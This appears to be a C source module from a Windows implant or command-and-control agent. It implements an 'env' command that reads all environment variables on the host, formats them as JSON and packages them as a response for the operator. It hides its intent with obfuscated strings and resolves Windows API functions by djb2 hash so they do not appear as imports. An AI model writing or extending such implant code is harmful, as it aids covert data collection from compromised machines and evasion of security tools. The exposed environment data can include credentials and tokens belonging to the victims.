#include "config.h"
#ifdef INCLUDE_CMD_ENV

#include "commands.h"
#include "json_out.h"

typedef PVOID (WINAPI *fn_GetEnvironmentStrings_t)(void);
typedef BOOL  (WINAPI *fn_FreeEnvironmentStringsA_t)(void*);

VOID cmd_env(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_k32, "kernel32.dll");
    HMODULE h_k32 = inst->Win32.LoadLibraryA(_k32);
    fn_GetEnvironmentStrings_t pGet = h_k32 ?
        (fn_GetEnvironmentStrings_t)resolve_function(h_k32, hash_string_djb2(XSTR("GetEnvironmentStringsA"))) : NULL;
    fn_FreeEnvironmentStringsA_t pFree = h_k32 ?
        (fn_FreeEnvironmentStringsA_t)resolve_function(h_k32, hash_string_djb2(XSTR("FreeEnvironmentStringsA"))) : NULL;
    if (!pGet || !pFree) {
        package_add_string(inst, response, XSTR("resolve failed"));
        response->is_error = TRUE;
        return;
    }

    char* env = (char*)pGet();
    if (!env) {
        package_add_string(inst, response, XSTR("GetEnvironmentStrings failed"));
        response->is_error = TRUE;
        return;
    }

    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"env\":{");

    BOOL first = TRUE;
    for (char* p = env; *p && !jb.truncated; p++) {
        if (first) first = FALSE; else j_append_raw(&jb, ",");
        // split name=value
        char* eq = p;
        while (*eq && *eq != '=') eq++;
        if (*eq != '=') { while (*p) p++; continue; }
        *eq = 0;
        j_append_str(&jb, p);
        j_append_raw(&jb, ":");
        j_append_str(&jb, eq + 1);
        *eq = '=';
        while (*p) p++;
    }

    j_append_raw(&jb, "}}");
    pFree(env);
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
